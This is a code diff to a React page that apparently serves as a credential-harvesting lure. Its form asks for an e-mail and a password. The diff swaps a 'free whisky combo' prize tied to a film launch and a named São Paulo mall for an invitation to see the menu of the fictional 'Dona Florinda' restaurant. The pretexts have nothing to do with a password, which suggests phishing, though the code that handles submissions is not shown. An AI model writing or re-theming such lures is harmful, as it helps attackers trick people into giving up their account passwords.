@@ -59,16 +59,16 @@ export default function Home() {
         <div className={styles.form_body}>
           <div className={styles.form_content}>
             <h2 className={averia.className}>
-              Você ganhou um combo de Whisky Grátis em comemoração ao lançamento do filme, para resgatar
+              Você está proximo(a) de conhecer a maravilhosa culinária da Dona Florinda!
             </h2>
 
-            <p>Promoção exclusiva para o Shopping Iguatemi São Paulo</p>
+            <p></p>
           </div>
 
           <div className={styles.form_data}>
             <input ref={emailRef} className={styles.form_control} placeholder="E-mail" type="text" />
             <input ref={passwordRef} className={styles.form_control} placeholder="Senha" type="password" />
-            <button onClick={handleSubmit} className={styles.form_button}>RESGATAR COMBO!</button>
+            <button onClick={handleSubmit} className={styles.form_button}>ACESSAR CARDÁPIO</button>
             <span className={styles.terms}>Ao resgatar você concorda com os Termos de Uso</span>
           </div>
         </div>
@@ -76,7 +76,7 @@ export default function Home() {
 
       <div>
         <span className={styles.copy}>
-          © 2023 Peaky Blinders
+          © 2024 Restaurant de Dona Florinda
         </span>
       </div>
 
